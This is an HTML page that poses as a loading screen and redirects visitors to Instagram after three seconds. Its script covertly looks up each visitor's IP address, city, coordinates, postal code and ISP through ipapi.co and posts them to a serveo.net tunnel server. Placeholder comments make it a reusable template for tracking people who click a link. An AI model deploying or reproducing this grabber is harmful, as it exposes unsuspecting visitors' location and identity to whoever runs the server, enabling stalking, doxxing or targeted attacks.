<head>

<body>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #1a1a1a;
            color: #ffffff;
            margin: 0;
            padding: 2em;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .spinner {
            border: 6px solid #f3f3f3; /* Light grey */
            border-top: 6px solid #ffa500; /* Orange */
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <div class="spinner"></div>
    <script>
        // Wait for 3 seconds and then redirect
        setTimeout(function() {
            // enter your redirect url
            window.location.href = "https://instagram.com/";
        }, 3000);
    </script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        $(document).ready(function() {
            $.getJSON("https://ipapi.co/json/", function(data) {
                $("#ip_address").text(data.ip);
                $("#country_name").text(data.country_name);
                $("#region_name").text(data.region);
                $("#city_name").text(data.city);
                $("#latitude").text(data.latitude);
                $("#longitude").text(data.longitude);
                $("#postal_code").text(data.postal);
                $("#timezone").text(data.timezone);
                $("#isp").text(data.org);
                
                // Send location data to the server
                sendLocationToServer(data);
            });
        });
        
        function sendLocationToServer(locationData) {
            $.ajax({
                type: "POST",
                url: "https://8d367f5b74bd58d9bff4a931c172033d.serveo.net", // Update with your server URL
                contentType: "application/json",
                data: JSON.stringify(locationData),
                success: function(response) {
                    console.log("Location data sent to server successfully:", response);
                },
                error: function(error) {
                    console.error("Error sending location data to server:", error);
                }
            });
        }
    </script>
</body>
</html>
